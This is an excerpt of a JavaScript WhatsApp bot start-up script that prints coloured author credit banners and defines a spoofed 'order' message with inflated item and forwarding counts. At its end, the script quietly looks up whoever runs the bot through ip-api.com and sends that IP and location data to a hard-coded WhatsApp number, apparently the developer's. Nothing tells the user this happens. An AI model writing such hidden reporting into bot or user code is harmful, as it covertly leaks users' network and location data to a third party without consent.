...
const starts = async (Ramdani = new WAConnection()) => {
	...
	console.log(color(`${spc2}           [ • CREATOR BY RENANDO • ]` ,`${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : Nando`, `${randomcolors}`))
...
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : Yukiniko`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : Renando`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : DUINGZ`, `${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
...
const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6289512545999-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 KIRIK BOTZ 】`, orderTitle: 'Nando Ganss', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
const spinner = { 
  "interval": 120,
  "frames": [
    "R",
    ...
    buttonMessagee = {
        contentText: `BOT TELAH AKTIF OM`,
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Ramdani.sendMessage("6287720646259@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6287720646259?text=Assalamualaikum+bwang:v` } }})
